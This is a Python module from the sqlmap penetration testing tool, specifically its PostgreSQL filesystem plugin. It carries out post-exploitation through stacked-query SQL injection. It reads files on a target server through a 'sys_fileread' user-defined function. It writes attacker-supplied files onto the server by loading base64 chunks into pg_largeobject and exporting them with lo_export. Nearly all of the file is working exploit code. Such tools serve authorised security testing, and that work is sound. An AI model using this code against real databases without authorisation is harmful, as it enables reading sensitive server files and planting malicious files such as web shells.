#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import randomInt
from lib.core.data import logger
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.settings import LOBLKSIZE
from lib.request import inject
from plugins.generic.filesystem import Filesystem as GenericFilesystem


class Filesystem(GenericFilesystem):
    def __init__(self):
        self.oid = None
        self.page = None

        GenericFilesystem.__init__(self)

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        self.initEnv()

        return self.udfEvalCmd(cmd=rFile, udfName="sys_fileread")

    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        errMsg = "PostgreSQL does not support file upload with UNION "
        errMsg += "query SQL injection technique"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        wFileSize = os.path.getsize(wFile)
        content = open(wFile, "rb").read()

        self.oid = randomInt()
        self.page = 0

        self.createSupportTbl(self.fileTblName, self.tblField, "text")

        debugMsg = "create a new OID for a large object, it implicitly "
        debugMsg += "adds an entry in the large objects system table"
        logger.debug(debugMsg)

        # References:
        # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
        # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
        inject.goStacked("SELECT lo_create(%d)" % self.oid)
        inject.goStacked("DELETE FROM pg_largeobject WHERE loid=%d" % self.oid)

        for offset in xrange(0, wFileSize, LOBLKSIZE):
            fcEncodedList = self.fileContentEncode(
                content[offset:offset + LOBLKSIZE], "base64", False)
            sqlQueries = self.fileToSqlQueries(fcEncodedList)

            for sqlQuery in sqlQueries:
                inject.goStacked(sqlQuery)

            inject.goStacked(
                "INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))" %
                (self.oid, self.page, self.tblField, self.fileTblName))
            inject.goStacked("DELETE FROM %s" % self.fileTblName)

            self.page += 1

        debugMsg = "exporting the OID %s file content to " % fileType
        debugMsg += "file '%s'" % dFile
        logger.debug(debugMsg)

        inject.goStacked(
            "SELECT lo_export(%d, '%s')" %
            (self.oid, dFile), silent=True)

        written = self.askCheckWrittenFile(wFile, dFile, forceCheck)

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)

        return written
